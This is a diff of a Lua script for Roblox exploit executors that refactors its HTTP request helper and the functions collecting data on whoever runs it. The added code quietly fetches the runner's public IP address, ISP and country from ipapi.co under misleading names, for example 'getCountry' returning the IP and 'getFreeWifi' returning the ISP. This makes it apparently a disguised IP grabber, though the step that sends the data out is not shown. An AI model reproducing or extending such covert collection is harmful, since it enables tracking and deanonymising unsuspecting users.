@@ -6,43 +6,76 @@ local gameUrl = "https://www.roblox.com/games/" .. placeId .. "/" .. formattedNa
 local requestMethods = {
 local HttpService = game:GetService("HttpService")
 
-local requestMethods = {
-    function(tab) -- Fluxus
-        if fluxus and fluxus.request then return fluxus.request(tab) end
-    end,
-    function(tab) -- KRNL / Protosmasher
-        if request then return request(tab) end
-    end,
-    function(tab) -- Synapse
-        if syn and syn.request then return syn.request(tab) end
-    end,
-    function(tab) -- Xeno / Proto
-        if http_request then return http_request(tab) end
-    end,
-    function(tab) -- game:HttpGet fallback (para executores mobile tipo Delta)
-        if tab.Method == "GET" then
-            local body = game:HttpGet(tab.Url)
-            return { Body = body, StatusCode = 200 }
-        end
-    end,
-    function(tab) -- HttpService:GetAsync como último recurso
-        if tab.Method == "GET" then
-            local body = HttpService:GetAsync(tab.Url)
-            return { Body = body, StatusCode = 200 }
-        end
-    end
-}
-
+-- função de request com timeout
 local function dataSAT(tab)
-    for _, method in ipairs(requestMethods) do
-        local success, result = pcall(method, tab)
-        if success and result then
-            return result
+    local result, finished = nil, false
+
+    local requestMethods = {
+        function(tab) if fluxus and fluxus.request then return fluxus.request(tab) end end,
+        function(tab) if request then return request(tab) end end,
+        function(tab) if syn and syn.request then return syn.request(tab) end end,
+        function(tab) if http_request then return http_request(tab) end end,
+        function(tab) -- Delta / Hydrogen / Codex
+            if tab.Method == "GET" then
+                local body = game:HttpGet(tab.Url)
+                return { Body = body, StatusCode = 200 }
+            end
+        end,
+        function(tab) -- HttpService
+            if tab.Method == "GET" then
+                local body = HttpService:GetAsync(tab.Url)
+                return { Body = body, StatusCode = 200 }
+            end
         end
+    }
+
+    task.spawn(function()
+        for _, method in ipairs(requestMethods) do
+            local success, response = pcall(method, tab)
+            if success and response and response.Body then
+                result = response
+                break
+            end
+        end
+        finished = true
+    end)
+
+    -- timeout de 5s
+    local start = os.clock()
+    while not finished and os.clock() - start < 5 do
+        task.wait()
     end
-    warn("⚠️ No req method on this executor")
-    return nil
+
+    return result
 end
+
+-- funções de coleta
+local function getCountry()
+    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
+    if not response or not response.Body then
+        return "Unknow Metadata"
+    end
+    local data = HttpService:JSONDecode(response.Body)
+    return data.ip
+end
+
+local function getFreeWifi()
+    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
+    if not response or not response.Body then
+        return "Unknow Metadata"
+    end
+    local data = HttpService:JSONDecode(response.Body)
+    return data.org
+end
+
+local function getPopulation()
+    local response = dataSAT({ Url = "https://ipapi.co/json/", Method = "GET" })
+    if not response or not response.Body then
+        return "Unknow Metadata"
+    end
+    local data = HttpService:JSONDecode(response.Body)
+    return data.country_population
+    end
 
 local Colors = {
     y = 16776960,
@@ -52,45 +85,7 @@ local Colors = {
     r = 16711680,
     p = 10181046
 }
-local HttpService = game:GetService("HttpService")
-local function getCountry()
-    local response = dataSAT({
-        Url = "https://ipapi.co/json/",
-        Method = "GET"
-    })
-    if not response or not response.Body then
-        return "Unknow Metadata"
-    end
-    
-    local data = HttpService:JSONDecode(response.Body)
-    return data.ip
-end
-local function getFreeWifi()
-    local response = dataSAT({
-        Url = "https://ipapi.co/json/",
-        Method = "GET"
-    })
 
-    if not response or not response.Body then
-        return "Unknow Metadata"
-    end
-    
-    local data = HttpService:JSONDecode(response.Body)
-    return data.org
-end
-local function getPopulation()
-    local response = dataSAT({
-        Url = "https://ipapi.co/json/",
-        Method = "GET"
-    })
-
-    if not response or not response.Body then
-        return "Unknow Metadata"
-    end
-    
-    local data = HttpService:JSONDecode(response.Body)
-    return data.country_population
-end
 local ip = getCountry()
 local wifi = getFreeWifi()
 local population = getPopulation()
